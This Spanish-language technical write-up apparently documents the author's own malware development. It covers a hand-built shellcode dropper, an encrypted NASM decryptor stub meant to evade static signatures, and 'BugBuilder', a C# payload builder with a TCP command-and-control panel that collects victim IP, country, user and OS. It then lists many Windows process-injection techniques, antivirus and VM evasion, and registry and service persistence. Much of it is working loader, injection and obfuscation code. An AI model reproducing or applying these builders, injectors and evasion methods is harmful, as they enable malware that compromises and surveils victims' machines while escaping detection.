02. Fase 1: El arte de la shellcode artesanal (hace 3 años)

El punto de partida no fue un builder con interfaz gráfica, sino un dropper puro en C. El objetivo era claro: escribir una shellcode capaz de lanzar un ejecutable (calc.exe) y finalizar limpiamente llamando a WinExec y ExitProcess. No se trataba de evadir AV, sino de entender la anatomía de una shellcode: cómo se posiciona en memoria, cómo resuelve las direcciones de la API de Windows y cómo pasa el control al flujo de ejecución modificado.

Para generar los opcodes primero escribimos la lógica en C estándar. Ese archivo (stub_shellcode.c) sirve como molde conceptual de lo que queremos a bajo nivel.

c · stub_shellcode.c
// stub_shellcode.c — Código de referencia para la shellcode final
#include <windows.h>

int main(void) {
    WinExec("calc.exe", 0);
    ExitProcess(0);
}

La tarea de ingeniería inversa consistió en traducir esto a Assembly NASM. Creamos stub_shellcode.asm: definimos manualmente la pila, pusheamos la cadena "calc.exe" en formato little-endian y configuramos los registros para la llamada a la API.

nasm · x86
; stub_shellcode.asm (Fragmento clave)
; Construcción del string "calc.exe" en la pila
xor  ecx, ecx
push ecx                ; Null terminator
push 0x6578652e         ; "exe." (little-endian)
push 0x636c6163         ; "calc"
mov  eax, esp           ; EAX apunta a "calc.exe"
💡
Little-endian en la práctica

Para pasar "calc.exe" a la pila en x86 hay que invertir el orden de los bytes. La shellcode no usa APIs de alto nivel para strings: todo son bytes crudos empujados a mano. Esto la hace independiente de la posición y sin dependencia de secciones de datos.

03. Resolución dinámica de la API (GetProcAddress)

Para que la shellcode funcione en distintas versiones de Windows no podemos hardcodear las direcciones de WinExec o ExitProcess. Aquí entra la técnica de resolución dinámica en tiempo de ejecución: usamos GetModuleHandle("kernel32.dll") para obtener la dirección base de la DLL. Kernel32 siempre está cargada en el espacio de memoria de los procesos de usuario. A diferencia del PEB walking en shellcode pura, aquí el dropper es un ejecutable compilado y podemos usar la API de Windows antes de saltar al código malicioso.

La herejía del formateo en el arreglo

Una vez obtenidas winexec_addr y exitprocess_addr, toca parcharlas dentro del arreglo de shellcode. El detalle crucial: x86 es little-endian. Si GetProcAddress devuelve una dirección como 0xAF5477FF, debe guardarse en el arreglo como 0xFF, 0x77, 0x54, 0xAF. Aplicamos máscaras y desplazamientos para extraer cada byte y colocarlo en la posición correcta; así el call ebx de la shellcode aterriza en WinExec. Olvidar este paso es el error clásico de novato: la shellcode salta a direcciones corruptas y crashea al instante.

c · misc.c
// Parcheo de la shellcode: invertimos los bytes (little-endian)
shellcode[18+1] = (*winexec_addr & 0x000000FF);
shellcode[18+2] = (*winexec_addr & 0x0000FF00) >> 8;
shellcode[18+3] = (*winexec_addr & 0x00FF0000) >> 16;
shellcode[18+4] = (*winexec_addr & 0xFF000000) >> 24;

04. El arte del despliegue: punteros a función

El archivo run.c contiene el mecanismo de lanzamiento. Declaramos un puntero a función (int(*func)()) y le asignamos la dirección del arreglo shellcode. Con func = (int(*)())shellcode; y luego func(), obligamos al procesador a saltar a nuestra región de datos y ejecutar esos bytes como código. Esa es la esencia de un dropper: no hay inyección en otro proceso, solo ejecución directa.

Limitación importante: la región del arreglo debe tener permisos de ejecución. Con DEP (Data Execution Prevention) habilitado haría falta un paso previo con VirtualProtect para marcar la página como ejecutable. En su momento la PoC se probó en un entorno controlado sin DEP para validar la lógica de la shellcode antes de añadir esa capa de evasión.

⚠️
Dropper vs exploit

Esta técnica es un "dropper": no secuestramos el EIP mediante un buffer overflow. Simplemente cargamos bytes ejecutables en memoria y redirigimos el flujo hacia ellos. Es más ruidosa pero más controlada. En un exploit real la shellcode se inyecta en otro proceso o se ejecuta tras corromper la pila.

05. Ofuscación avanzada: el stub criptográfico en NASM

Mientras el builder en C# resolvía la generación de payloads, surgió otra cuestión más fundamental: proteger la shellcode en reposo. A finales de 2025 me planteé un stub descifrador en Assembly puro: la shellcode real viaja cifrada (con un esquema de claves dinámicas) y un pequeño stub en NASM la descifra en tiempo de ejecución antes de saltar a ella. Doble objetivo: evadir firmas estáticas y complicar el análisis forense.

El payload de prueba (Linux x86)

Para esta PoC utilicé un payload mínimo que ejecuta una syscall de salida en Linux (exit(10+22)):

c · payload
// Shellcode: mov ebx, 10; add ebx, 22; mov eax, 1; int 0x80
static unsigned char raw[] = {
    0xBB, 0x0A, 0x00, 0x00, 0x00,
    0x83, 0xC3, 0x16,
    0xB8, 0x01, 0x00, 0x00, 0x00,
    0xCD, 0x80,
    0x90 // NOP padding
};

La lógica de descifrado (bloques XOR con mutación)

El stub en NASM descifra por bloques. En lugar de un XOR estático, cada bloque de 4 bytes mezcla operaciones: A ^ B + (C - 1) - (D + 1). Los datos cifrados viven en .data y el stub reserva un buffer en .bss. No depende de constantes fijas globales: cada bloque tiene sus propias claves (A, B, C, D), permitiendo generar un stub personalizado por payload. La mezcla de operaciones aritméticas y lógicas no es trivial de simplificar para un motor de análisis estático.

nasm · x86
; ASM resultante del stub descifrador
decode_loop:
    mov eax, [esi]       ; A
    mov ebx, [esi+4]     ; B
    mov edx, [esi+8]     ; C
    mov ebp, [esi+12]    ; D
    xor eax, ebx         ; A ^ B
    dec edx              ; C - 1
    add eax, edx         ; + (C-1)
    inc ebp              ; D + 1
    sub eax, ebp         ; - (D+1)
    mov [edi], eax       ; Escribir opcode restaurado
    jmp decoded_buffer   ; Transferencia de control al payload
⚠️
Advertencia de portabilidad

Este stub usa la convención de syscalls de Linux x86 (int 0x80). La diferencia clave con Windows: interrupciones de software frente a llamadas a la API kernel32. El descifrado XOR por bloques es totalmente portable a Windows si se ajusta la shellcode objetivo y se sustituye la syscall de salida por ExitProcess.

06. Fase 2: BugBuilder — automatización y C2 (hace 2 años)

La shellcode manual era poderosa pero impráctica a gran escala. La evolución lógica fue BugBuilder, un proyecto en C# (.NET Framework) que traslada el dropper a un entorno de construcción visual con panel de control.

El motor de compilación interno: Roslyn y CodeDOM

Uno de los mayores desafíos fue generar un ejecutable sin un compilador externo instalado. La solución: incrustar el compilador de C# dentro del builder.

  • CodeDOM (Code Document Object Model): genera código fuente y lo compila en tiempo de ejecución con CSharpCodeProvider. Es la opción más portable y la usada en la PoC inicial.
  • Roslyn (Microsoft.CodeAnalysis.CSharp): el compilador moderno como servicio; control más granular sobre sintaxis y árboles de expresión. Ideal para payloads que requieren características modernas del lenguaje.

El código fuente de la carga útil se mantiene como recurso embebido en el ensamblado y se reemplazan marcadores de posición (placeholders) con la configuración del usuario (IP, puerto, ofuscación) antes de compilar. Así se genera un binario único por campaña sin herramientas externas.

Arquitectura del proyecto

  • El Builder (cliente): interfaz Windows Forms donde el operador configura el payload (ícono, nombre de archivo, persistencia en registro/startup/copias) e integra módulos de ofuscación y encoding de tráfico.
  • El Servidor C2: listener TCP asíncrono que recibe conexiones de los clientes infectados. Los datos viajan en JSON, facilitando el parseo de la información del bot (IP, país, SO, usuario, ping).

El protocolo de comunicación TCP

A diferencia del dropper original (que solo ejecutaba calc.exe), BugBuilder establece un canal de persistencia. El cliente se conecta al servidor, serializa un objeto ModelInfo a JSON y lo envía. La elección de JSON sobre binario fue pragmática: facilita la depuración, es legible durante el desarrollo y es trivial de parsear con Newtonsoft.Json.

c# · ModelInfo
// Estructura del dato exfiltrado
public class ModelInfo {
    public string ip { get; set; }
    public string country { get; set; }
    public string user_pc { get; set; }
    public bool status { get; set; }
    public string operatingSystem { get; set; }
    public int ping { get; set; }
}

// Envío al servidor
string json = JsonConvert.SerializeObject(modelInfo);
stream.Write(Encoding.UTF8.GetBytes(json), 0, json.Length);

El panel de control (C2)

  • Builder: configuración del payload. Parámetros de red (Host/IP, Puerto) y técnicas de evasión como compresión del tráfico o cifrado (XOR, AES, RSA).
  • Infected: grid en tiempo real con los bots conectados, ordenados por IP, país, usuario, SO y latencia (ping).
✅
Evidencia de madurez técnica

Opciones como LZMA, GZip, Huffman y distintos esquemas de cifrado marcan la transición de una PoC académica a una herramienta orientada a operaciones que enfrenta firewalls e IDS. La variabilidad del payload es clave para evadir firmas estáticas — el mismo principio aplicado en el triage automatizado con analystty, donde la detección de TTPs debe adaptarse a payloads ofuscados.

07. Bitácora de desarrollo: de la idea al GridView

La construcción del builder no fue lineal. Rescatando los registros de chat originales se traza la evolución del pensamiento técnico.

La semilla de la idea (enero 2024)

El problema inicial: generar un .exe sin un compilador externo. La solución: incrustar todo lo necesario dentro del ensamblado, usando el compilador de C# en memoria y el código de la carga útil como strings de recursos. Después llegó la UI modular (ícono, ofuscación del tráfico) sobre la arquitectura de compilación interna (CodeDOM).

Una vez generado el .exe, debía reportar a casa. La decisión: serialización ligera (JSON) sobre TCP, un modelo de datos (ModelInfo) para mapear la información de la víctima y un GridView para visualizarla.

El problema de las "flags"

La flag para evaluar el pipeline de procesamiento demuestra una comprensión temprana de los protocolos maliciosos avanzados. No basta enviar datos: binario y servidor deben negociar si el tráfico va codificado, comprimido o cifrado (opciones Encode/Compress/Encrypt de la UI final). Esa negociación es lo que hace al C2 flexible ante cambios en las defensas del target.

La trampa del "todo en strings"

En septiembre de 2024 reflexioné sobre la arquitectura. La primera iteración almacenaba todo el código del payload como strings literales en los recursos, con las herramientas de compilación incrustadas. Era funcional pero frágil: cualquier cambio en la lógica exigía modificar cadenas largas y propensas a errores de sintaxis. La lección: el builder debía ser modular, con plantillas parametrizables en lugar de código hardcodeado.

"Es que pensé que era como un builder, la última vez que intenté hacer un builder opte por dejar todo el código en string y las herramientas de compilación en el resources"

10. Classic code injection into the process

Consiste en introducir código malicioso en un proceso legítimo en ejecución y secuestrarlo para fines propios:

  • Identificar el proceso de destino (notepad.exe u otro proceso crítico).
  • Inyectar el código escribiendo directamente en su espacio de memoria o cargando una DLL maliciosa.
  • Ejecutar el código inyectado creando un hilo nuevo en el proceso o reescribiendo instrucciones con un salto al código.

Mecanismos defensivos y sus evasiones:

  • DEP (Data Execution Prevention): impide ejecutar código desde memoria no confiable.
  • ASLR (Address Space Layout Randomization): aleatoriza el diseño de la memoria del proceso.
  • CFG (Control Flow Guard): rastrea el flujo de control para detectar intentos de inyección.

El caso más simple: "encontrar un espacio de memoria de un proceso (el mismo proceso) y escribir sobre él".

c · win32
// Classic code injection - Proceso propio
unsigned char my_payload[] = "";
unsigned int my_payload_len = sizeof(my_payload);

int main(void) {
    void* my_payload_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    my_payload_mem = VirtualAlloc(0, my_payload_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
    rv = VirtualProtect(my_payload_mem, my_payload_len,
        PAGE_EXECUTE_READ, &oldprotect);
    if(rv != 0) {
        th = CreateThread(0, 0,
            (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
    return 0;
}

Para pivotar a otro proceso (p. ej. calc.exe) se usa OpenProcess, VirtualAllocEx, WriteProcessMemory y CreateRemoteThread; la memoria se asigna directamente en el espacio de direcciones del objetivo con permisos de ejecución.

11. Classic DLL injection into the process

Consiste en cargar una DLL maliciosa en un proceso legítimo. Flujo: localizar la DLL, crear un hilo en el proceso destino, asignar memoria para la ruta de la DLL, cargarla con LoadLibraryA y ejecutar su punto de entrada (DllMain).

c · dllmain.cpp
// dllmain.cpp - DLL maliciosa de ejemplo
#include "pch.h"
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD nReason, LPVOID lpReserved) {
    switch (nReason) {
    case DLL_PROCESS_ATTACH:
        MessageBox(NULL,
            (LPCWSTR)L"Meow from DLL!",
            (LPCWSTR)L"=^..^=", MB_OK);
        break;
    }
    return TRUE;
}
⚠️
DLL hijacking en Windows 10

En teoría, para hacer DLL hijacking solo hay que explotar la jerarquía de búsqueda de las DLL. Pero en Windows 10 moderno las pruebas no funcionan por protecciones como Known DLLs y las mitigaciones de búsqueda de DLL.

12. Find process ID by name and inject to it

Lógica para encontrar procesos por nombre e inyectarlos usando CreateToolhelp32Snapshot y Process32First/Next:

c · win32
int findMyProc(const char* procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
    pe.dwSize = sizeof(PROCESSENTRY32);
    hResult = Process32First(hSnapshot, &pe);
    while(hResult) {
        if (strcmp(procname,
            (const char*)pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }
    CloseHandle(hSnapshot);
    return pid;
}

13. Windows shellcoding 1 — punteros a función

Patrón fundamental de ejecución de shellcode mediante punteros a función: exactamente el mecanismo del dropper original.

c
char code[] = "my shellcode here";
int main(int argc, char **argv) {
    int (*func)();
    func = (int(*)()) code;
    (int)(*func)();
    return 1;
}

Se incluye un script auxiliar en Python para revertir strings y convertirlos a hexadecimal en formato little-endian, necesario al construir la shellcode:

python
import sys
input = sys.argv[1]
chunks = [input[i:i+4] for i in range(0, len(input), 4)]
for chunk in chunks[::-1]:
    print(chunk[::-1].encode("utf-8").hex())

14. Windows shellcoding 2 — PEB y TEB

Cada vez que se ejecuta un .exe se crean las estructuras PEB (Process Environment Block) y TEB (Thread Environment Block). El PEB contiene la información necesaria para el proceso; cada hilo tiene su propio TEB. Escribiendo en ASM se recorre la estructura PEB → LDR para encontrar la dirección de kernel32.dll sin usar GetModuleHandle:

nasm · x86
; Encontrar kernel32.dll via PEB
mov eax, [fs:ecx + 0x30]  ; Desplazamiento a PEB
mov eax, [eax + 0xc]   ; Desplazamiento a LDR
mov eax, [eax + 0x14]  ; InMemoryOrderModuleList
mov eax, [eax]         ; 1er módulo (nuestro .exe)
mov eax, [eax]         ; 2do módulo (ntdll.dll)
mov eax, [eax + 0x10]  ; 3er módulo (kernel32.dll)

15. Windows shellcoding 3 — PE file structure

Un archivo PE es el formato nativo de Win32 (análogo a los COFF de Unix). Su estructura incluye:

  • DOS Header: información necesaria para cargar el archivo PE.
  • DOS Stub: zona mayormente de ceros tras los primeros 64 bytes.
  • PE Header (NT Header): contiene la firma "PE\0\0" (bytes 50 45 00 00).
  • File Header (COFF Header): características básicas del archivo.
  • Optional Header: contiene AddressOfEntryPoint, ImageBase, SectionAlignment, SizeOfImage y los directorios de datos (exportación, importación, recursos, excepciones, certificados, reubicación, TLS, IAT, CLR runtime header, etc.).
  • Section Table: arreglo de IMAGE_SECTION_HEADER que define secciones como .text.

16. APC injection technique (Early Bird)

La técnica Early Bird aprovecha QueueUserAPC para encolar un APC (Asynchronous Procedure Call) en un hilo específico:

  1. Crear un proceso legítimo con el flag CREATE_SUSPENDED.
  2. Asignar memoria para la carga útil en el espacio del nuevo proceso.
  3. Declarar la rutina APC que apunta a la shellcode.
  4. Reanudar el hilo principal para que ejecute el APC antes de su ejecución normal.

APC injection via NtTestAlert

NtTestAlert es una syscall no documentada que comprueba si hay APC pendientes en el hilo actual y los ejecuta. Antes de que cualquier hilo comience a ejecutarse, su dirección de inicio Win32 llama a NtTestAlert para ejecutar APC pendientes — sin necesidad de un hilo remoto en otro proceso.

APC injection via alertable threads

Variante que localiza los subprocesos del proceso destino y encola un APC a todos, maximizando la probabilidad de ejecución.

17. Code injection via thread hijacking

El secuestro de un proceso se logra suspendiéndolo y vaciando su memoria, que luego se reemplaza con código malicioso:

  1. Crear un identificador del proceso víctima.
  2. Suspender el proceso con SuspendThread.
  3. Obtener el contexto del hilo con GetThreadContext (incluye el registro RIP).
  4. Modificar ct.Rip = (DWORD_PTR)rb para que apunte a la shellcode.
  5. Establecer el contexto modificado con SetThreadContext.
  6. Reanudar el hilo con ResumeThread.

18. Classic DLL injection via SetWindowsHookEx

SetWindowsHookEx permite instalar hooks de sistema global. Al configurar un hook de teclado (WH_KEYBOARD) con una callback que reside en nuestra DLL, el sistema carga la DLL en el espacio de direcciones de los procesos que reciben mensajes de teclado. Los sistemas modernos bloquean la técnica con CFG (Control Flow Guard) y CIG (Code Integrity Guard).

c · win32
// DLL exportada
extern "C" __declspec(dllexport) int Meow() {
    MessageBox(NULL,
        (LPCWSTR)L"Meow meow",
        (LPCWSTR)L"=^..^=", MB_OK);
    return 0;
}

// Configuración del hook global
HHOOK hook = SetWindowsHookEx(WH_KEYBOARD,
    (HOOKPROC)meowFunc, meowDll, 0);

19. Code injection via Windows fibers

Fibers es una API para hilos de ejecución ligeros: más eficientes que los hilos del sistema pero menos seguros (no están protegidos con sus características). Flujo:

  1. Convertir el hilo actual en un Fiber con ConvertThreadToFiber(NULL).
  2. Asignar memoria para el código malicioso con VirtualAlloc.
  3. Crear una nueva Fiber con CreateFiber apuntando al código.
  4. Cambiar el contexto con SwitchToFiber.

20. Windows API hooking

El API hooking intercepta y modifica el comportamiento de las llamadas a la API. Consiste en reemplazar los primeros 5 bytes de la función original con un JMP relativo (\xE9) que redirige a una función personalizada. Hay que almacenar los bytes originales para poder restaurar la función cuando sea necesario. Un segundo método usa push + ret (\x68 + dirección + \xC3) en lugar del salto relativo.

21. DLL injection via undocumented NtCreateThreadEx

Utiliza la función no documentada NtCreateThreadEx de ntdll.dll, que permite indicar el tamaño de la pila y otras flags de creación, dando más flexibilidad que CreateRemoteThread. Al no estar documentada ni exportarse de la biblioteca de importación de kernel32.dll, es más sigilosa que las técnicas tradicionales.

22. Code injection via memory sections (NtCreateSection)

Una sección es un bloque de memoria compartido entre procesos, creado con NtCreateSection:

  1. Crear una sección de memoria compartida con NtCreateSection.
  2. Mapear la sección localmente con NtMapViewOfSection.
  3. Mapear la misma sección en el proceso objetivo (solo lectura).
  4. Copiar el payload en la sección local (se refleja en la remota).
  5. Crear un hilo remoto con RtlCreateUserThread.
  6. Desmapear con ZwUnmapViewOfSection.

23. Code injection via ZwQueueApcThread

Similar a la APC estándar pero usando ZwQueueApcThread en lugar de QueueUserAPC. Combina la creación de secciones de memoria compartida con ZwCreateSection y el encolado de APC con la función nativa de ntdll.dll. Se usa ZwSetInformationThread con THREADINFOCLASS 1 para forzar que el hilo se vuelva alertable.

24. Process injection via KernelCallbackTable

KernelCallbackTable es una tabla de punteros a funciones para registrar controladores de eventos del kernel. Al inyectar código en esta tabla, un atacante reemplaza un controlador existente por uno propio: cuando se produce el evento se llama al controlador malicioso, ejecutando código arbitrario en el contexto del proceso objetivo.

25. Process injection via RWX memory hunting

Busca regiones de memoria con permisos RWX (Read-Write-Execute) en el proceso objetivo usando VirtualQueryEx. Una vez encontrada, escribe la shellcode directamente y crea un hilo remoto. Evita la llamada a VirtualAllocEx, reduciendo la huella de llamadas sospechosas.

26. Process injection via FindWindow

Usa FindWindow para localizar el HWND del proceso objetivo; luego GetWindowThreadProcessId obtiene el PID y se procede con la inyección estándar.

VM evasion via FindWindow

Variante de evasión que busca ventanas específicas de VirtualBox (VBoxTrayToolWndClass, VBoxTrayToolWnd) para detectar si se está en un entorno virtualizado y condicionar la ejecución del payload.

27. Download and inject logic

Técnica para descargar una carga útil o DLL maliciosa desde una URL usando HTTP (WinInet). Puede funcionar detrás de redes que solo permiten tráfico HTTP e incluso a través de un proxy preconfigurado. El flujo: abrir sesión HTTP con InternetOpen, descargar con InternetOpenUrl e InternetReadFile, guardar con CreateFile/WriteFile e inyectar usando la técnica clásica de DLL injection.

28. Run shellcode via EnumDesktopsA / EnumChildWindows

Técnicas que aprovechan funciones de enumeración que aceptan un callback como parámetro. Al pasar la dirección de la shellcode como callback, el sistema la ejecuta en el contexto del proceso actual:

  • EnumDesktopsA: enumera escritorios; el callback se pasa como DESKTOPENUMPROC.
  • EnumChildWindows: enumera ventanas secundarias; el callback se pasa como WNDENUMPROC.

29. AV engines evasion: XOR encryption

El cifrado XOR aplica la operación byte a byte entre la shellcode y una clave secreta:

  1. Cifrado: se toma la shellcode, se elige una clave aleatoria y se aplica XOR bit a bit a cada byte.
  2. Descifrado en tiempo de ejecución: la misma clave XOR se aplica al arreglo cifrado antes de copiarlo a memoria ejecutable.
c
void XOR(char* data, size_t data_len,
    char* key, size_t key_len) {
    int j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

Se incluye un script Python que automatiza el flujo: cifrar la shellcode, reemplazar el placeholder en la plantilla C++ y compilar con MinGW.

30. Hiding function calls with XOR encryption

Aplica XOR al nombre de funciones API como VirtualAlloc para que no aparezcan como strings legibles en el binario. En tiempo de ejecución se descifra el nombre, se obtiene la dirección con GetProcAddress y se asigna a un puntero de función para su uso.

31. API hashing for AV evasion

El hashing convierte el nombre de la función en un hash único y usa ese hash en lugar del nombre real:

  1. Cargar la DLL con LoadLibrary.
  2. Recorrer la tabla de exportación de la DLL.
  3. Calcular el hash de cada nombre de función exportada.
  4. Comparar con el hash pre-calculado de la función deseada.
  5. Si coincide, obtener la dirección y usarla.

Evita que strings como "VirtualAlloc" o "CreateThread" aparezcan en el binario, eludiendo firmas estáticas.

32. Persistence techniques

Registry run keys

Modificar las claves de ejecución del registro para que el código se ejecute al iniciar el sistema o al iniciar sesión: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.

Screensaver hijack

Reemplazar el salvapantallas legítimo modificando las claves ScreenSaveActive, ScreenSaveTimeout y SCRNSAVE.EXE bajo HKEY_CURRENT_USER\Control Panel\Desktop.

COM DLL hijack

Sustituir una DLL legítima de un objeto COM por una maliciosa en Software\Classes\CLSID\{...}\InprocServer32.

Windows services

Los servicios corren en segundo plano sin interfaz gráfica. La persistencia se logra creando un servicio con inicio automático o modificando uno existente para que apunte a un binario malicioso.

AppInit_DLLs

La clave AppInit_DLLs especifica DLLs que se cargan automáticamente en el espacio de casi todas las aplicaciones cuando inician. Requiere altos privilegios.

Netsh helper DLL

Netsh puede cargar DLLs auxiliares. Al registrar una DLL maliciosa como helper (con la exportación InitHelperDll) se cargará cada vez que se ejecute la herramienta.

Winlogon

Modificar HKEY_LOCAL_MACHINE\...\Windows NT\CurrentVersion\Winlogon\Shell y ...\Winlogon\Userinit para ejecutar código al iniciar sesión.

Port monitors

Los monitores de puerto del servicio de cola de impresión (spoolsv.exe) pueden reemplazarse por una DLL maliciosa cargada en el contexto del servicio, vía \System\CurrentControlSet\Control\Print\Monitors\[nombre].
